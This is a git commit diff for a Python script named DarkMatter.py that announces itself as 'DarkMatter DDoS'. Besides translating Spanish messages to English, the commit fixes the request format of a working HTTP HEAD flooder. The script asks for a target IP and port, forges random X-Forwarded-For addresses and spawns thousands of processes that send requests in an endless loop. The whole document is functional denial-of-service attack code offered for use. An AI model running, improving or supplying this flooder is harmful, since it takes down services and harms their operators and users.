c97291f1c7b325409e6a6a5189b9151d48338465
CryptoXSS <91107078+CryptoXSS@users.noreply.github.com>
2022-02-20 15:25:45 +0100

    Update DarkMatter.py

--- DarkMatter.py
+++ DarkMatter.py
@@ -5,20 +5,20 @@ import multiprocessing
 import random
 import platform
 
-
 print("Detecting System...")
 sysOS = platform.system()
-print("Sistema detectado: ", sysOS)
+print("System detected: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 130000")
+    os.system("ulimit -n 1030000")
   except Exception as e:
     print(e)
-    print("No se pudo iniciar el script")
+    print("Could not start the script")
 else:
-  print("Su sistema no es Linux, es posible que no pueda ejecutar este script en algunos sistemas")
-  
+  print("Your system is not Linux, You may not be able to run this script in some systems")
+
+
 def randomip():
   randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
   return randip
@@ -28,7 +28,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + "HTTP/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
@@ -42,19 +42,18 @@ def attack():
     except:
       pass
 
-print("Bienvenido a DarkMatter DDoS\n")
+print("Welcome To DarkMatter DDoS\n")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
-url = f"http://{str(ip)}" 
-print("[>>>] RS-28 Sarmat [<<<]")
+url = f"http://{str(ip)}"
+print("[>>>] Starting the attack [<<<]")
 sleep(1)
 
-
-def send3attack():
-  for i in range(50000): #Poder Mágico
+def send2attack():
+  for i in range(5000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
+
     
-    
-send3attack()
+send2attack()
